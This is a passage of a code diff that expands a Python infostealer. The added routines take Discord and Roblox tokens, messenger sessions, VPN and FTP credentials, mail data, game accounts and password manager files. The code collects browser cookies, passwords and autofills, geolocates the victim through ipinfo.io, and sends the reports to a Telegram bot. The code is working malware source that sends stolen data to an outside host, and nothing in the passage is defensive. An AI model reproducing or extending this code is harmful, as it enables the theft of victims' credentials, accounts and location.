+                with open(os.path.join(filePath, "Sessions", "roblox_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.RobloxAccounts:
+                        file.write(value)
+            if ListFonction.DiscordAccounts:
+                with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.DiscordAccounts:
+                        file.write(value)
+
 
             if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Computer"))
                 except:pass
+
             if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Browsers"))
                 except:pass
+
+
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Sessions"))
                 except:pass
@@ -720,21 +2123,63 @@ class get_data:
 
             tasks = [
                 self.StealWallets(filePath),
+
+                # Messengers
                 self.StealTelegramSession(filePath),
+                self.StealWhatsApp(filePath),
+                self.StealSignal(filePath),
+                self.StealSkype(filePath),
+                self.StealElement(filePath),
+                self.StealPidgin(filePath),
+                self.StealTox(filePath),
+                self.StealViber(filePath),
+
+                # VPN Files
+                self.StealProtonVPN(filePath),
+                self.StealOpenVPN(filePath),
+                self.StealSurfsharkVPN(filePath),
+                self.StealNordVPN(filePath),
+                
+                
+                # FTP Client
+                self.StealFileZilla(filePath),
+                self.StealWinSCP(filePath),
+                self.StealPutty(filePath),
+
+                # BackupMail
+                self.BackupMailbird(filePath),
+                self.BackupThunderbird(filePath),
+                # self.StealOutlook(filePath),
+
+                # Password Manager
                 self.StealPasswordManagers(filePath),
+
+                # Games
+                self.StealUbisoft(filePath),
                 self.StealEpicGames(filePath),
+                self.StealGrowtopia(filePath),
                 self.StealSteamFiles(filePath),
+                self.StealBattleNet(filePath),
             ]
             await asyncio.gather(*tasks)
             count_folders_in = {
+                "Messenger": len(os.listdir(os.path.join(filePath, "Messenger"))),
+                "VPN": len(os.listdir(os.path.join(filePath, "VPN"))),
+                "Email": len(os.listdir(os.path.join(filePath, "Email"))),
                 "Wallets": len(os.listdir(os.path.join(filePath, "Wallets"))),
+                "FTP Clients": len(os.listdir(os.path.join(filePath, "FTP Clients"))),
                 "Games": len(os.listdir(os.path.join(filePath, "Games"))),
                 "PasswordManager": len(os.listdir(os.path.join(filePath, "PasswordManager"))),
             }
+
+            ListFonction.Messengers.append(str(count_folders_in["Messenger"]))
+            ListFonction.VpnsCounts.append(str(count_folders_in["VPN"]))
+            ListFonction.MailsCounts.append(str(count_folders_in["Email"]))
             ListFonction.WalletsCounts.append(str(count_folders_in["Wallets"]))
+            ListFonction.FtpClient.append(str(count_folders_in["FTP Clients"]))
             ListFonction.GamesCounts.append(str(count_folders_in["Games"]))
             ListFonction.PasswordManager.append(str(count_folders_in["PasswordManager"]))
-            folders_to_check = ["Wallets", "Games", "Password Managers"]
+            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
             
             for folder in folders_to_check:
                 try:
@@ -768,9 +2213,7 @@ class get_data:
                     passwords.append(word)
                 if found_autofill: 
                     autofills.append(word)
-
             text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"
-
             if cookies: 
                 text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
             if passwords: 
@@ -779,7 +2222,6 @@ class get_data:
                 text += f"<b>Autofills:</b>\n<code>{', '.join(autofills if autofills else None)}</code>\n"
 
             send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-
             message_payload = {
                 'chat_id': CHAT_ID,
                 'text': text,
@@ -799,7 +2241,9 @@ class get_data:
             shutil.make_archive(filePath, "zip", filePath)
             system_info = platform.uname()
 
-            data = requests.get("https://ipinfo.io/json").json()
+            url = "https://ipinfo.io/json"
+            resp = requests.get(url)
+            data = resp.json()
 
             ipaddress = data.get("ip")
             region = data.get("region")
@@ -807,6 +2251,7 @@ class get_data:
             location = data.get("loc", "").split(",")
             latitude = location[0] if len(location) > 0 else "Unknown"
             longitude = location[1] if len(location) > 1 else "Unknown"
+            google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
 
             text = f"""
 <b>👤  <i><u>{hostname} - All Info</u></i></b>
@@ -822,6 +2267,7 @@ class get_data:
 <b>IP Address:</b> <code>{ipaddress}</code>
 <b>Region:</b> <code>{region}</code>
 <b>Country:</b> <code>{country}</code>
+<b>Location:</b> <a href="{google_maps_link}">View on Google Maps</a>
 
 <b><i><u>Browser</u></i></b>
 <b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
@@ -830,12 +2276,23 @@ class get_data:
 <b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
 
 <b><i><u>Social Media</u></i></b>
+<b>Reddit:</b> <code>{str(len(ListFonction.RedditAccounts))}</code>
 <b>Instagram:</b> <code>{str(len(ListFonction.InstagramAccounts))}</code>
+<b>Guilded:</b> <code>{str(len(ListFonction.GuildedAccounts))}</code>
+<b>Patreon:</b> <code>{str(len(ListFonction.PatreonAccounts))}</code>
+<b>Spotify:</b> <code>{str(len(ListFonction.SpotifyAccount))}</code>
+<b>Twitch:</b> <code>{str(len(ListFonction.TwitchAccounts))}</code>
 <b>Twitter:</b> <code>{str(len(ListFonction.TwitterAccounts))}</code>
 <b>TikTok:</b> <code>{str(len(ListFonction.TikTokAccounts))}</code>
+<b>RiotUser:</b> <code>{str(len(ListFonction.RiotUserAccounts))}</code>
+<b>Roblox:</b> <code>{str(len(ListFonction.RobloxAccounts))}</code>
 
 <b><i><u>Other</u></i></b>
+<b>Messenger:</b> <code>{str(len(ListFonction.Messengers))}</code>
+<b>VPN:</b> <code>{str(len(ListFonction.VpnsCounts))}</code>
+<b>FTP Client:</b> <code>{str(len(ListFonction.FtpClient))}</code>
 <b>Games:</b> <code>{str(len(ListFonction.GamesCounts))}</code>
+<b>Mail:</b> <code>{str(len(ListFonction.MailsCounts))}</code>
 <b>Wallets:</b> <code>{str(len(ListFonction.WalletsCounts))}</code>
 <b>Password Manager:</b> <code>{str(len(ListFonction.PasswordManager))}</code>
 """
